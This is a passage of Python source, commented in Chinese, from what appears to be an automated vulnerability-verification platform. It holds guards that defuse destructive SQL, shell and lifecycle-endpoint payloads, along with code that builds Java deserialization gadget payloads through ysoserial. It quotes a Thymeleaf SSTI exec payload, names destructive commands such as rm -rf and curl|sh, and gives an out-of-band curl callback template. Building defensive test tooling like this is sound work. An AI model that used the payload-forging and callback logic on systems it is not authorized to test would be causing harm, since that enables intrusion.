    return any(p.search(t) for p in _DESTRUCTIVE_CMD_PATTERNS)


def is_destructive_command_payload(payload: Any) -> bool:
    """payload 是否含破坏性系统命令（rm -rf / mkfs / dd of= / 关机 / fork bomb / curl|sh 等）。"""
    return _has_destructive_command(str(payload or ""))


def _neutralize_exec_args(text: str) -> str:
    """把 `exec("破坏性命令")` 的参数换成无害探针，保留其余结构。"""
    def _repl(m: "re.Match[str]") -> str:
        if _has_destructive_command(m.group("arg")):
            return "%s(%s%s%s)" % (m.group("pre"), m.group("q"), _BENIGN_COMMAND_PROBE, m.group("q"))
        return m.group(0)

    return _EXEC_ARG_RE.sub(_repl, text)


def normalize_attack_payload(payload: Any, param_name: Any = "") -> str:
    """去掉 A2 误把「参数名=值」整串当 payload 的前缀（payload 应只是**值**）。

    背景（#8 SSTI 未确认的真因）：A2 给 `/marketing/preview` 产出
    `tpl=[[${T(java.lang.Runtime).getRuntime.exec("calc")}]]`，D1 又把它作为 `tpl` 参数的值
    注入 → 目标收到 `tpl=tpl=[[${...}]]` → Thymeleaf 按字面渲染，SSTI 永不触发、D2 恒 no_evidence。
    这里按 param_name 剥掉前缀，恢复 payload 的真实形态。
    """
    text = str(payload or "")
    pn = str(param_name or "").strip()
    if pn and text[: len(pn) + 1].lower() == (pn + "=").lower():
        return text[len(pn) + 1:]
    return text


def is_destructive_sql_payload(payload: Any) -> bool:
    """判定 payload 是否含破坏性 SQL（DROP/TRUNCATE/ALTER/无 WHERE 的 DELETE·UPDATE 等）。

    先 URL 解码再匹配，防止 `%44ROP` 一类编码绕过。
    """
    text = str(payload or "")
    if not text:
        return False
    try:
        import urllib.parse as _up
        text = _up.unquote(text)
    except Exception:
        pass
    return any(p.search(text) for p in _DESTRUCTIVE_SQL_PATTERNS)


def downgrade_destructive_payload(payload: Any, family: str = "",
                                  probe: str = _SYNTAX_ERROR_PROBE,
                                  command_probe: str = _BENIGN_COMMAND_PROBE) -> str:
    """把破坏性 payload 降级为「可证明可达、但零破坏」的探针；非破坏性原样返回。

    D1 投放前的最后一道「不破坏环境」防线，覆盖两类破坏性：
      1. 破坏性 SQL（DROP/TRUNCATE/ALTER/无 WHERE 的 DELETE·UPDATE）→ 换成语法错误型探针（`'`）；
      2. 破坏性系统命令（rm -rf / mkfs / dd of= / 关机 / fork bomb / curl|sh 等）→
         结构化 payload 只把 exec 的参数换成 whoami（保留 SSTI/SpEL 结构，仍证明可达），
         裸命令 payload 整条换成 whoami。
    无论 payload 来自 A2 LLM、SCA 弹药库还是靶场 README，都不例外。
    """
    text = str(payload or "")
    if not text:
        return text
    if is_destructive_sql_payload(text):
        logger.warning(
            "[attack_context] 破坏性 SQL payload 降级为语法错误型证明（family=%s）：%s → %r",
            family or "-", text[:120], probe,
        )
        return probe
    if _has_destructive_command(text):
        neutralized = _neutralize_exec_args(text)
        if neutralized != text:
            logger.warning(
                "[attack_context] 破坏性命令 payload 中和 exec 参数为 %r（family=%s，保留 payload 结构）：%s",
                command_probe, family or "-", text[:120],
            )
            return neutralized
        logger.warning(
            "[attack_context] 破坏性命令 payload 整条替换为无害探针 %r（family=%s）：%s",
            command_probe, family or "-", text[:120],
        )
        return command_probe
    return text


#
# 为什么 3.4-C 不够：`is_destructive_sql_payload` 只看「payload 文本里有没有破坏性 SQL」。
# 未判角色）的 D1 重放，投放的是**合法业务请求**（payload 是一个真实 uid），
# handler 直接 `userMapper.deleteById(uid)` —— 请求里没有任何 SQL 关键字，第一层防线完全看不见它，
# 此后所有 vertical spec 登录失败 → 全判 no_evidence（假阴性），且真实环境不自愈、只能人工回滚。
#
# 修法：按 (method, endpoint) 语义给操作风险分类，三档处置（与 3.4-C 同一哲学：证明力换安全）：
#   absent_id —— 能靠「不存在的哨兵资源 id」中和的。这类 handler 都按 id 取行
#                （`deleteById(uid)` / `updateStatus(orderId,..)` / `updatePassword(id,..)`），
#                id 取不到即 no-op（**零持久化变更**），而「操作被服务端接受」这一
#                越权/缺校验判据仍然可观测 → 把资源 id 换成 ABSENT_RESOURCE_ID。
#   skip      —— 无法用 id 中和的（凭据变更 / 批量赋值提权 / 金额变动：要么真改靶标持久状态，
#                要么改掉扫描账号自身凭据并污染其后所有轮次）→ 整条不执行，如实标 skipped，
#                绝不伪造证据（数据真实性铁律）。
#   None      —— 读操作 / 追加型写（发评论、下单、支付回调、导入 XML）→ 原样放行。
#
# 与 3.4-C 分开而不是合并：前者拦 payload 文本、后者拦操作语义，二者互补且都必要。
ABSENT_RESOURCE_ID = "2147483647"   # 哨兵资源 id：32 位有符号上限，业务库不可能存在该行

# 破坏性动词出现在路径里（段首/段尾/下划线连字符边界），或 HTTP 方法为 DELETE。
_DESTRUCTIVE_VERB_RE = re.compile(
    r"(?i)(?:^|/)(?:delete|remove|destroy|drop|purge|wipe|truncate|revoke|unbind)(?:/|$|[_\-])"
)
# 凭据变更（改密/重置/登出）：会把扫描账号自己的登录态打掉，属不可接受的副作用。
_CREDENTIAL_RE = re.compile(
    r"(?i)(?:password|passwd|pwd|change-?password|reset-?password|set-?password|password-?reset|logout|signout|revoke-?token)"
)
# 批量赋值提权（把请求参数无白名单灌进实体，含 role/isVip/balance 等敏感字段）。
_MASS_ASSIGN_RE = re.compile(r"(?i)/(?:profile|user|account)/update(?:/|$)")
# 资金流出（真改余额/订单金额）。
_MONEY_OUT_RE = re.compile(
    r"(?i)(?:^|/)(?:withdraw|cashout|payout|transfer|refund|settle|recharge)(?:/|$|[_\-])"
)
# 状态覆写（把资源状态改成请求里指定的任意值：审单置 PAID、审核置 approved）。
_STATUS_OVERWRITE_RE = re.compile(
    r"(?i)(?:^|/)(?:review|approve|reject|moderate|ban)(?:/|$|[_\-])"
)

#
# 为什么单列一类并置顶拦截：这类端点一旦命中，会重启/终止**正在被验证的目标进程本身**。它既是
# 正是 SSRF spec 把回显地址指向靶场自身管理端点（/restart、/shutdown、/actuator/shutdown）所致。
#
# 判定要点（与既有破坏性闸门互补，不是替代）：
#   1) 既有 classify_destructive_operation 覆盖删除/凭据/批量赋值/资金/状态覆写，但**不含生命周期端点**；
#   2) SSRF 形态的致命点在于「自毁 URL 嵌在参数值里」，请求路径本身看起来正常（就是 /ssrf 之类），
#      只看路径永远抓不到 —— 必须同时扫 params/body 里所有字符串值。
# 只认会「重启/终止进程」的端点；/actuator/health、/actuator/info、/actuator/metrics 等只读端点放行。
_LIFECYCLE_PATH_RE = re.compile(
    r"(?i)(?:^|/)(?:restart|shutdown|shut-down|reboot|halt|poweroff|power-off|stop|kill|terminate|exit)(?:/|$|[_\-])"
)
_LIFECYCLE_ACTUATOR_RE = re.compile(r"(?i)/actuator/(?:shutdown|restart)\b")
_LIFECYCLE_CATEGORY = "process_lifecycle"


def classify_lifecycle_target(text: Any) -> Optional[str]:
    """文本（HTTP 路径，或 SSRF payload 里嵌的内网 URL）是否指向进程生命周期/自毁端点。

    命中返回 ``_LIFECYCLE_CATEGORY``，否则 None。先 URL 解码，防 %72 类编码绕过。
    """
    t = str(text or "")
    if not t:
        return None
    try:
        import urllib.parse as _up
        t = _up.unquote(t)
    except Exception:  # noqa: BLE001
        pass
    if _LIFECYCLE_PATH_RE.search(t) or _LIFECYCLE_ACTUATOR_RE.search(t):
        return _LIFECYCLE_CATEGORY
    return None


def _iter_text_values(*objs: Any) -> List[str]:
    """递归收集 dict/list 里的所有字符串值（用于扫描 SSRF payload 里嵌的自毁 URL）。"""
    out: List[str] = []

    def _walk(o: Any) -> None:
        if isinstance(o, str):
            out.append(o)
        elif isinstance(o, dict):
            for v in o.values():
                _walk(v)
        elif isinstance(o, (list, tuple)):
            for v in o:
                _walk(v)

    for obj in objs:
        _walk(obj)
    return out

# 类别 → 处置。absent_id 可安全化；skip 必须整条跳过；restore_after 可回滚后验证。
_ABSENT_ID_SAFE_CATEGORIES = ("data_destroy", "money_out", "status_overwrite")
_SKIP_CATEGORIES = ("credential_mutation", "mass_assignment", _LIFECYCLE_CATEGORY)

# 结构上不可能 confirmed（F1 上限被压到 13 < 门槛 16）。
# 它们的共同点是「把标量字段写到某个可定位资源上」——因此可以取基线快照、投放、再把基线写回。
# 放行的前提是调用方严格遵守 restore_after 契约（见 neutralize_destructive_spec 的 guard.reason）：
#   1) 投放前必须取到可回滚基线，取不到就不许投放；
#   2) 投放后必须回滚并复读校验；
#   3) 回滚失败必须显式落 failure，绝不允许「确认了但没还原」。
# 契约由调用方（d1_service）实现，闸门只负责放行并声明要求。
_RESTORE_AFTER_CATEGORIES = ("credential_mutation", "mass_assignment")

RESTORE_AFTER_ENABLED = str(os.environ.get("SAST_AI_RESTORE_AFTER", "1")).strip().lower() not in ("0", "false", "no", "off")

# 资源 id 参数名白名单（分段匹配，避免 "id" 误伤 "identity" / "idea" 这类）。
_ID_PARAM_TOKENS = (
    "id", "ids", "uid", "uuid", "user_id", "userid", "order_id", "orderid",
    "address_id", "addressid", "comment_id", "commentid", "product_id", "productid",
    "resource_id", "resourceid", "account_id", "accountid", "target_id", "targetid",
    "item_id", "itemid", "pid", "aid", "oid", "cid", "rid", "vid",
)

# 破坏性闸门干预记录（进程内环形缓冲，供诊断/报告；不落库、不参与裁决）。
DESTRUCTIVE_GUARD_EVENTS: List[Dict[str, Any]] = []
_DESTRUCTIVE_GUARD_EVENTS_MAX = 200

# 落库回调：扫描启动时由 benchmark_cli 注入（闭包捕获 task_id + 懒连接），
# 使「人入环」关键决策可持久化、可跨重启审计。不设置则只保留进程内缓冲。
_GUARD_AUDIT_SINK: Optional[Any] = None


def register_guard_audit_sink(sink) -> None:
    """注入 guard 事件落库回调 ``sink(event: dict) -> None``（由扫描进程设置）。"""
    global _GUARD_AUDIT_SINK
    _GUARD_AUDIT_SINK = sink


def record_destructive_guard_event(event: Dict[str, Any]) -> None:
    """登记一次破坏性闸门干预：进程内环形缓冲（诊断）+ 可选落库（审计）。"""
    ev = dict(event)
    try:
        DESTRUCTIVE_GUARD_EVENTS.append(ev)
        del DESTRUCTIVE_GUARD_EVENTS[:-_DESTRUCTIVE_GUARD_EVENTS_MAX]
    except Exception:  # noqa: BLE001
        pass
    if _GUARD_AUDIT_SINK is not None:
        try:
            _GUARD_AUDIT_SINK(ev)
        except Exception:  # noqa: BLE001 审计失败绝不阻断验证
            pass


def destructive_guard_report() -> Dict[str, Any]:
    """汇总本次进程内的闸门干预（按类别/处置计数），供诊断与报告说明。"""
    by_action: Dict[str, int] = {}
    by_category: Dict[str, int] = {}
    for e in DESTRUCTIVE_GUARD_EVENTS:
        by_action[str(e.get("action") or "?")] = by_action.get(str(e.get("action") or "?"), 0) + 1
        by_category[str(e.get("category") or "?")] = by_category.get(str(e.get("category") or "?"), 0) + 1
    return {"total": len(DESTRUCTIVE_GUARD_EVENTS), "by_action": by_action,
            "by_category": by_category, "events": list(DESTRUCTIVE_GUARD_EVENTS)}


def is_id_param_name(name: Any) -> bool:
    """参数名是否表示「资源 id」（按分隔符/驼峰切分后精确匹配，避免子串误伤）。"""
    raw = str(name or "").strip()
    if not raw:
        return False
    parts = re.split(r"[^0-9A-Za-z]+|(?<=[a-z0-9])(?=[A-Z])", raw)
    return any(p.lower() in _ID_PARAM_TOKENS for p in parts if p)


def classify_destructive_operation(method: Any, endpoint: Any) -> Optional[str]:
    """按 (method, endpoint) 语义分类破坏性操作；非破坏性返回 None。

    判定顺序即优先级：凭据变更 > 批量赋值 > 通用删除 > 资金流出 > 状态覆写。
    登录端点显式豁免（其语义是建立会话，不是破坏）。
    """
    ep = str(endpoint or "").strip().lower().split("?")[0]
    if not ep:
        return None
    # 生命周期/自毁端点优先级最高：命中即拦（不只是中和），因为它会杀掉被验证进程本身。
    if classify_lifecycle_target(ep):
        return _LIFECYCLE_CATEGORY
    if ep.rstrip("/").endswith("/login") or ep.rstrip("/").endswith("/signin"):
        return None
    m = str(method or "GET").upper()
    if _CREDENTIAL_RE.search(ep):
        return "credential_mutation"
    if _MASS_ASSIGN_RE.search(ep):
        return "mass_assignment"
    if _DESTRUCTIVE_VERB_RE.search(ep) or m == "DELETE":
        return "data_destroy"
    if _MONEY_OUT_RE.search(ep):
        return "money_out"
    if _STATUS_OVERWRITE_RE.search(ep):
        return "status_overwrite"
    return None


def _rewrite_id_values(obj: Any) -> Any:
    """把 dict 里所有「id 类」参数的值换成哨兵（改动副本，不改入参）。"""
    if not isinstance(obj, dict):
        return obj
    out: Dict[str, Any] = {}
    for k, v in obj.items():
        out[k] = ABSENT_RESOURCE_ID if is_id_param_name(k) else v
    return out


def neutralize_destructive_spec(spec: Any) -> "tuple[Dict[str, Any], Dict[str, Any]]":
    """对触发规格做破坏性闸门归一。

    返回 (归一后的 spec 副本, guard 记录)。guard 为空 dict 表示无需干预。
    guard["action"] ∈ {"absent_id", "skip"}：
      - absent_id：资源 id 已换成哨兵，请求仍投放（零持久化变更，越权判据保留）。
      - skip：**调用方必须放弃投放**（凭据/金额/批量赋值无法用 id 中和），如实标 skipped。

    只改「资源定位值」（param_value / victim_resource_id / body / representative_request_params
    里的 id 字段），**绝不动 taint_marker（canary）** —— canary 是 I1 的请求级关联身份，改了就断链。
    """
    src = dict(spec or {})
    endpoint = src.get("target_endpoint") or src.get("route") or ""
    method = src.get("http_method") or src.get("method") or "GET"
    category = classify_destructive_operation(method, endpoint)
    if not category:
        return src, {}

    # （排障或靶标不接受任何写入时用）。
    if category in _RESTORE_AFTER_CATEGORIES and RESTORE_AFTER_ENABLED:
        note = {
            "category": category, "action": "restore_after",
            "endpoint": str(endpoint), "method": str(method).upper(),
            "reason": ("可回滚验证：调用方投放前必须取到可回滚基线，投放后必须立即把基线写回并复读校验；"
                       "取不到基线或回滚失败一律不得判 confirmed —— 宁可判不了，也不留持久变更"),
        }
        record_destructive_guard_event(note)
        logger.warning("[destructive-guard] restore-after %s %s（category=%s）：放行，但强制回滚校验",
                       note["method"], note["endpoint"], category)
        return src, note

    if category in _SKIP_CATEGORIES:
        note = {
            "category": category, "action": "skip",
            "endpoint": str(endpoint), "method": str(method).upper(),
            "reason": ("破坏性操作无法用哨兵 id 中和（凭据变更/批量赋值会真改靶标持久状态或扫描账号凭据），"
                       "按 safe_mode 不投放，如实标 skipped —— 不伪造证据"),
        }
        record_destructive_guard_event(note)
        logger.warning("[destructive-guard] skip %s %s（category=%s）：%s",
                       note["method"], note["endpoint"], category, note["reason"])
        return src, note

    # absent_id：只当归一后确实找到了可替换的 id 值才算生效；找不到则退化为 skip（不能装作安全）。
    out = dict(src)
    changed: List[str] = []
    pname = out.get("param_name")
    _template_id = re.search(r"\{(\w*[Ii]d)\}", str(endpoint))

    # 上（/wallet/withdraw 的 amount、/api/comment/moderate 的 status），把资源 id 换成哨兵并不能
    # 阻止真实持久化变更（金额照扣、状态照写）→ 一律 skip，不靠「id 是假的」自我安慰。
    if pname and not is_id_param_name(pname) and not _template_id:
        note = {
            "category": category, "action": "skip",
            "endpoint": str(endpoint), "method": str(method).upper(),
            "reason": ("破坏性动作的变更参数（%s）不是资源 id，哨兵中和无法阻止真实持久化变更，"
                       "按 safe_mode 不投放，如实标 skipped" % pname),
        }
        record_destructive_guard_event(note)
        logger.warning("[destructive-guard] skip(non-id-param) %s %s（param=%s, category=%s）",
                       note["method"], note["endpoint"], pname, category)
        return src, note

    # 否则 replay_vertical 会在 param_value 缺失时回填「受害者真实 uid」
    # （d1_service.replay_vertical：param_name 有值且 param_value 为空 → 取 victim/attacker 的 user_id），
    # 哨兵形同虚设，真删/真改照旧发生。
    if pname and is_id_param_name(pname):
        out["param_value"] = ABSENT_RESOURCE_ID
        changed.append(str(pname))

    # VICTIM_FROM_POOL 只是登记期占位，重放期会被解析成真实 victim 对象 id（replay_bola / replay_race），
    # 破坏性端点若留着它，absent_id 分支仍会把真实受害者 id 发出去 → 必须换成哨兵。
    vid = out.get("victim_resource_id")
    if vid and str(vid) not in ("", ABSENT_RESOURCE_ID):
        out["victim_resource_id"] = ABSENT_RESOURCE_ID
        changed.append("victim_resource_id")
    if isinstance(out.get("body"), dict):
        nb = _rewrite_id_values(out["body"])
        if nb != out["body"]:
            out["body"] = nb
            changed.append("body")
    # 路径模板兜底：endpoint 形如 /order/{id}/refund，且当前参数**不是**资源 id（或干脆没有）时，
    # 改用路径 id 注入（param_name 取模板里的 id 名、值换哨兵）。这样资源定位由路径承担，
    # handler 取不到行 → no-op；同时 canary 走路径仍能完成 I1 请求级关联。
    if _template_id and (not pname or not is_id_param_name(pname)):
        out["param_name"] = _template_id.group(1)
        out["param_location"] = "path"
        out["param_value"] = ABSENT_RESOURCE_ID
        changed.append(str(_template_id.group(1)))
    reps = out.get("representative_request_params")
    if isinstance(reps, list):
        nr = []
        for rp in reps:
            rp2 = dict(rp) if isinstance(rp, dict) else rp
            if isinstance(rp2, dict):
                # DB 态（trigger_specs.representative_request_params_json，由 entry_discovery 产出）name/value。
                # 只认 param_name 会让 DB 态 spec 的 id 参数漏改 → 真实 id 照旧发出去。
                _rn = rp2.get("param_name") or rp2.get("name")
                if is_id_param_name(_rn):
                    _hit = False
                    for _vk in ("param_value", "value"):
                        if _vk in rp2:
                            rp2[_vk] = ABSENT_RESOURCE_ID
                            _hit = True
                    if not _hit:
                        rp2["param_value"] = ABSENT_RESOURCE_ID
            nr.append(rp2)
        if nr != reps:
            out["representative_request_params"] = nr
            changed.append("representative_request_params")

    if not changed:
        note = {
            "category": category, "action": "skip",
            "endpoint": str(endpoint), "method": str(method).upper(),
            "reason": ("破坏性操作但找不到可中和的资源 id 参数（无法保证零变更），"
                       "按 safe_mode 不投放，如实标 skipped"),
        }
        record_destructive_guard_event(note)
        logger.warning("[destructive-guard] skip(no-id) %s %s（category=%s）",
                       note["method"], note["endpoint"], category)
        return src, note

    note = {
        "category": category, "action": "absent_id",
        "endpoint": str(endpoint), "method": str(method).upper(),
        "params": changed, "absent_resource_id": ABSENT_RESOURCE_ID,
        "reason": ("破坏性操作按哨兵 id 投放：资源 id 换成不存在的 %s，handler 取不到行即 no-op"
                   "（零持久化变更），「操作被服务端接受」的越权判据保留" % ABSENT_RESOURCE_ID),
    }
    record_destructive_guard_event(note)
    logger.warning("[destructive-guard] absent-id %s %s（category=%s, params=%s）",
                   note["method"], note["endpoint"], category, ",".join(changed))
    return out, note


def guard_http_request(method: Any, url: Any, params: Any = None,
                       json_body: Any = None, form_body: Any = None) -> Dict[str, Any]:
    """HTTP 发送层的破坏性硬闸门（纵深防御，重写式、绝不跳过）。

    与 `neutralize_destructive_spec` 互补：spec 层归一拦的是「登记好的参数」，
    本函数拦的是**任何**构造路径最终发出去的请求（含 path 段里的数值 id）。
    `_send_one` 等统一发送点调用它；对非破坏性端点零副作用。
    """
    from urllib.parse import urlsplit
    out = {"params": params, "json_body": json_body, "form_body": form_body, "note": {}}
    try:
        path = urlsplit(str(url or "")).path
    except Exception:  # noqa: BLE001
        path = str(url or "")
    category = classify_destructive_operation(method, path)
    # SSRF 形态：自毁 URL 常嵌在参数/body 的值或完整 URL 的 query 里，请求路径本身正常
    # （就是 /ssrf 之类）—— 必须扫所有字符串值，否则永远抓不到。
    if category != _LIFECYCLE_CATEGORY:
        _cand = [str(url or ""), path] + _iter_text_values(params, json_body, form_body)
        if any(classify_lifecycle_target(_v) for _v in _cand):
            category = _LIFECYCLE_CATEGORY
    if category == _LIFECYCLE_CATEGORY:
        # 生命周期/自毁端点：发送层硬拦（不是中和、不是只记录）—— 命中即不可逆，绝不投放。
        note = {"category": _LIFECYCLE_CATEGORY, "action": "blocked",
                "endpoint": path, "method": str(method).upper(), "url": str(url or "")[:300],
                "reason": ("命中进程生命周期/自毁端点（会重启或终止被验证进程、并使本轮 D2 批次作废），"
                           "发送层硬拦，不投放")}
        out["blocked"] = True
        out["note"] = note
        record_destructive_guard_event(note)
        logger.error("[destructive-guard] BLOCKED %s %s（process_lifecycle）",
                     str(method).upper(), path)
        return out
    if not category:
        return out
    if category in _SKIP_CATEGORIES:
        # 发送层不做 skip（调用方已按 spec 层判定），只记录以便审计。
        record_destructive_guard_event({"category": category, "action": "observed",
                                        "endpoint": path, "method": str(method).upper(),
                                        "reason": "发送层观测到凭据/批量赋值类请求（spec 层应已 skip）"})
        return out
    changed: List[str] = []
    if isinstance(params, dict):
        np = _rewrite_id_values(params)
        if np != params:
            out["params"] = np
            changed.append("params")
    for key in ("json_body", "form_body"):
        obj = out.get(key)
        if isinstance(obj, dict):
            nobj = _rewrite_id_values(obj)
            if nobj != obj:
                out[key] = nobj
                changed.append(key)
    # 刻意不改写 URL 里的数值路径段：`/api/v2/delete` 的 "2" 是版本号不是资源 id，
    # 盲目改写会破坏请求。路径型资源 id 统一由 spec 层的 {id} 模板替换兜底
    # （neutralize_destructive_spec 的 path 模板分支）。
    if changed:
        note = {"category": category, "action": "absent_id", "endpoint": path,
                "method": str(method).upper(), "params": changed,
                "reason": "HTTP 发送层硬闸门：破坏性路由的资源 id 改写为哨兵 %s" % ABSENT_RESOURCE_ID}
        out["note"] = note
        record_destructive_guard_event(note)
        logger.warning("[destructive-guard] http-absent-id %s %s（category=%s, %s）",
                       note["method"], path, category, ",".join(changed))
    return out


def _resolve_code_root(db: Any, spec: Optional[Dict[str, Any]]) -> str:
    """取代码根：显式传入优先，否则从 workspace.target_path 查。

    拿不到就返回空串 —— 调用方（可达性判定）会据此明确判不可达，
    而不是拿空路径去扫出「什么都没有」然后误判为不可利用。
    """
    spec = spec or {}
    workspace_id = spec.get("workspace_id")
    if db is None or not workspace_id:
        return ""
    try:
        row = db.execute("SELECT target_path FROM workspaces WHERE id = ?", (workspace_id,), fetchone=True)
        if row:
            return str(next(iter(row.values()), "") or "")
    except Exception as exc:
        logger.debug("[attack_context] 读取 workspace.target_path 失败：%s", exc)
    return ""


def _load_sca_components(db: Any, spec: Optional[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """取该 workspace / task 的 SCA 组件清单（ecosystem / name / version）。

    只取组件本身，不按 CVE 过滤：commons-collections 3.1 这类库即使没有对应 CVE，
    本身也是可用的 gadget 源，弹药库按 (package, version) 匹配即可。

    取数优先级：workspace_id → task_id → 全盘最近 200 条。实测 sca_components 表的
    workspace_id 常为 NULL（写入侧未回填），但 task_id 一定在（每次扫描按 task 落库），
    故必须按 task_id 兜底，否则方案 1a 的 SCA 兜底触发拿不到组件清单而永远漏判。
    """
    spec = spec or {}
    if db is None:
        return []
    workspace_id = spec.get("workspace_id")
    task_id = spec.get("task_id")
    try:
        rows: List[Dict[str, Any]] = []
        if workspace_id:
            rows = db.execute(
                "SELECT ecosystem, name, version FROM sca_components WHERE workspace_id = ?",
                (workspace_id,), fetchall=True,
            ) or []
        if not rows and task_id:
            rows = db.execute(
                "SELECT ecosystem, name, version FROM sca_components WHERE task_id = ?",
                (task_id,), fetchall=True,
            ) or []
        if not rows:
            rows = db.execute(
                "SELECT ecosystem, name, version FROM sca_components ORDER BY id DESC LIMIT 200",
                fetchall=True,
            ) or []
    except Exception as exc:
        logger.debug("[attack_context] 读取 sca_components 失败：%s", exc)
        return []
    return [dict(r) for r in rows if isinstance(r, dict) and r.get("name")]


def _oob_command(spec: Dict[str, Any]) -> str:
    """反序列化族的带外可回执命令。

    为什么必须用 OOB：gadget 一旦在服务端执行，本地没有可观测副作用（exec 的是靶机进程），
    平台要证明「payload 真被执行」只能靠跨网络回执。这里把平台可控的唯一域名嵌进 gadget
    命令，服务端执行即产生一次 DNS 查询回到我们的域名。

    未启用（未配 SAST_AI_OOB_BASE_DOMAIN）时返回空串，调用方回落默认命令——
    **绝不编造域名**：拼不出域名就没有回执，没有回执就不构成第四层证据。
    """
    try:
        from src.iast import oob_monitor as _oob
        if not _oob.oob_enabled():
            return ""
        token = _oob.new_token()
        domain = _oob.oob_domain(token)
        if not domain:
            return ""
        try:
            _oob.register(
                token,
                task_id=spec.get("task_id"),
                family=str(spec.get("family") or spec.get("category") or ""),
                target_endpoint=str(spec.get("target_endpoint") or ""),
                spec_id=spec.get("id"),
            )
        except Exception:
            pass
        # 原地回写：D1 重放侧与人工核对都从 spec 上取 token，避免跨进程传参丢失。
        spec["oob_token"] = token
        # （``nslookup <token>.<base>``，回执端配 DNS 模式）；无公网域名 / 靶机与平台同机的
        # 实验室场景用 ``SAST_AI_OOB_COMMAND_TEMPLATE`` 指定回执通道，例如
        # ``curl -s http://127.0.0.1:8088/{token}``（回执端配 HTTP 模式，token 走路径）。
        # 两种形态下 token 都是每次投放新生成的不可预测值，回执必须按 token 对号入座。
        tmpl = os.environ.get("SAST_AI_OOB_COMMAND_TEMPLATE", "").strip()
        cmd = tmpl.format(token=token, domain=domain) if tmpl else f"nslookup {domain}"
        logger.info("[attack_context] 反序列化载荷已嵌入带外回执 token=%s domain=%s cmd=%s",
                    token, domain, cmd)
        return cmd
    except Exception as exc:
        logger.warning("[attack_context] OOB 命令生成失败（回落默认命令）：%s", exc)
        return ""


def sca_forge_attack_payloads(spec: Optional[Dict[str, Any]] = None,
                              db: Any = None,
                              code_root: Optional[str] = None,
                              command: str = "",
                              forge: Any = None,
                              gateway: Any = None) -> List[str]:
    """SCA 驱动选弹补位（方案 C + D）：A2 没造出真弹时，用 SCA 依赖事实补造。

    这是「A2 造弹、D1 投弹」原则的唯一例外，且只在例外场景生效：
    反序列化族 A2 历来只产出 `base64(serialized_object)` 这类占位串，
    整条链会因此降级成 canary 探针。此时由 SCA 依赖事实（库+版本）+ 弹药库
    （config/payload_library.yaml）+ ysoserial（tools/ysoserial-all.jar）补造真弹。

    三道闸缺一不可，缺任何一道都返回空（让 D1 老实降级）：
      1. 可达性：库在 classpath 上 + 代码里有利用入口（SCA 命中版本 ≠ 可利用）；
      2. 弹药库/LLM：按 (package, version) 选出当前版本确实可用的链；
      3. 自检：造出的 payload 必须是合法序列化流/合法 JSON（挡住 LLM 伪造的废弹）。

    返回空列表表示无弹可投，调用方必须按 attack_degraded 处理。
    """
    spec = spec or {}
    # 执行就产生一次可核对的 DNS 回执。未启用 OOB 时回落默认命令（本地 ping，无回执但无害）。
    _is_deser = str(spec.get("category") or spec.get("family") or "").strip().lower() == "deserialization"
    _forge_cmd = command or ""
    if not _forge_cmd and _is_deser:
        _forge_cmd = _oob_command(spec) or ""
    if not _forge_cmd:
        _forge_cmd = _DEFAULT_FORGE_COMMAND
    # 方案 1a：命中「字段驱动 Transformer.transform」sink 模式（ctf-java-quote 式自定义接线）
    # → 用 sink 模式 gadget 构造器造真字节，不走 SCA/ysoserial（后者对自定义接线打不中）。
    # 构造器内部已过自检，产物非法会直接抛 GadgetBuildError（报错而非降级）。
    # 此分支在 SCA 可达性门控之前：sink 模式已由 A2 的 poc_chain 确认，无需 SCA 复判。
    try:
        from src.iast.gadget_builder import (
            build_for_sink_pattern,
            GadgetBuildError,
            sca_confirms_gadget_library,
        )
        gb = build_for_sink_pattern(spec, command=_forge_cmd)
        if not gb:
            # 方案 1a SCA 兜底触发：A2 的 poc_chain 文本标注不稳定（有时写 CommonsCollections6
            # gadget chain、有时只写 readObject），导致 _sink_is_transformer_field 偶发漏判。
            # 但只要 SCA 确认 classpath 上存在 commons-collections 等已知 gadget 库，该反序列化
            # sink 仍是「字段驱动 Transformer.transform」模式（ctf-java-quote 式），强制按此模式
            # 造真字节，不依赖 A2 文本标注的稳定性。force=True 跳过文本门控、直接造 CommonsCollections
            # Transformer gadget；产物仍过 selfcheck，废弹绝不登记。
            family = str(spec.get("category") or spec.get("family") or "").strip().lower()
            if family == "deserialization":
                comps = _load_sca_components(db, spec)
                if sca_confirms_gadget_library(comps):
                    logger.info(
                        "[attack_context] 反序列化 sink 命中 SCA gadget 库（commons-collections 等），"
                        "按方案 1a 强制造 Transformer gadget（绕过 A2 文本标注缺失）"
                    )
                    gb = build_for_sink_pattern(
                        spec, command=_forge_cmd, force=True
                    )
        if gb:
            _selfcheck_or_raise([gb])
            return [gb]
    except GadgetBuildError as exc:
        logger.warning("[attack_context] gadget 构造器失败，回退 ysoserial/弹药库路径：%s", exc)

    family = str(spec.get("category") or spec.get("family") or "").strip().lower()
    if not family:
        return []
    try:
        from src.iast.reachability import GADGET_FAMILIES
    except Exception:
        return []
    # 只对需要精确 gadget 链的族启用：文本族 A2 自己能造弹，
    # 对它做可达性判定（要扫代码）纯属浪费，还可能引入假阴性。
    if family not in GADGET_FAMILIES:
        return []

    components = _load_sca_components(db, spec)
    if not components:
        return []
    root = code_root or _resolve_code_root(db, spec)
    if not root:
        logger.info(
            "[attack_context] SCA 驱动选弹跳过：code_root 为空，无法判定可达性"
            "（宁可降级，不可拿未验证的 gadget 去打）"
        )
        return []

    try:
        from src.iast.payload_forge import PayloadForge
        # 而 PayloadForge._forge_from_llm 开头就是 `if self.gateway is None: return []`，
        # 于是「LLM 兜底造弹」这条腿无论武器库命中与否都恒不生效（静默、不报错）。
        forge = forge or PayloadForge(gateway=gateway)
        out = forge.forge_from_sca(components, family=family, code_root=root,
                                   command=_forge_cmd)
    except Exception as exc:
        logger.warning("[attack_context] SCA 驱动选弹异常，按无弹处理：%s", exc)
        return []

    if out.get("payloads"):
        logger.info("[attack_context] SCA 驱动选弹成功：%s", out.get("reason", ""))
        payloads = [str(p) for p in out["payloads"] if p]
        # 自检门（评审第 3 点）：生成结果必须先过 selfcheck，不过直接报错，绝不把废弹当真弹投出。
        _selfcheck_or_raise(payloads)
        return payloads
    logger.info("[attack_context] SCA 驱动选弹无可用 payload：%s", out.get("reason", ""))
    return []


# SCA 造弹的默认命令：只用于产生可观测副作用的验证性 gadget，不做破坏性操作。
# 靶机 OS 不同命令不同（Linux: ping -c；Windows: ping -n），生产环境应按应用配置覆盖。
_DEFAULT_FORGE_COMMAND = "ping -c 2 127.0.0.1"


def build_attack_context(vuln_dict: Optional[Dict[str, Any]] = None,
